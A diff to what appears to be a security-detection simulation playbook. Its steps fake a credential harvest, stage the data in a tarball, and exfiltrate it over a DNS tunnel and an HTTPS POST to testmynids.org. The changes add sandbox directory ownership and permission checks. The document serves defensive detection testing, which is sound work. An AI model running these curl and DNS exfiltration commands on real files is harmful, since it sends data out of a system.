@@ -104,7 +104,7 @@ steps:
     name: "Collect sensitive-looking data from endpoint"
     command: |
       echo '[MP-003] XDR: local data collection simulating credential harvest';
-      mkdir -p /tmp/cortexsim_stage;
+      rm -rf /tmp/cortexsim_stage && mkdir -m 700 /tmp/cortexsim_stage || { echo "sandbox /tmp/cortexsim_stage could not be created fresh: something else is at that path" >&2; exit 1; };
       echo "# Simulated credential file - NOT real credentials" > /tmp/cortexsim_stage/creds.txt;
       for i in 1 2 3 4 5; do
         echo "user$i:simulated-hash-$(openssl rand -hex 16)" >> /tmp/cortexsim_stage/creds.txt;
@@ -129,6 +129,7 @@ steps:
   - id: step-02
     name: "Stage data in compressed format"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim_stage 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim_stage is missing or not ours: step-01 did not complete" >&2; exit 1; }
       echo '[MP-003] XDR: staging compressed tarball';
       tar -czf /tmp/cortexsim_stage/bundle.tar.gz /tmp/cortexsim_stage/creds.txt 2>/dev/null;
       ls -la /tmp/cortexsim_stage/;
@@ -149,6 +150,7 @@ steps:
   - id: step-03
     name: "Exfiltrate staged data over DNS tunnel"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim_stage 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim_stage is missing or not ours: step-01 did not complete" >&2; exit 1; }
       echo '[MP-003] NDR: DNS tunneling exfiltration - high volume + high entropy';
       B64=$(base64 -w 0 /tmp/cortexsim_stage/bundle.tar.gz | head -c 2000);
       chunks=$((${#B64} / 60));
@@ -190,6 +192,7 @@ steps:
   - id: step-04
     name: "Alternative exfil: HTTPS POST to known-bad endpoint"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim_stage 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim_stage is missing or not ours: step-01 did not complete" >&2; exit 1; }
       echo '[MP-003] NDR: second exfil channel for redundant detection';
       curl -sSL -m 15 -X POST -F "data=@/tmp/cortexsim_stage/bundle.tar.gz" \
         "http://testmynids.org/uid/index.html" 2>/dev/null | head -5 || true;
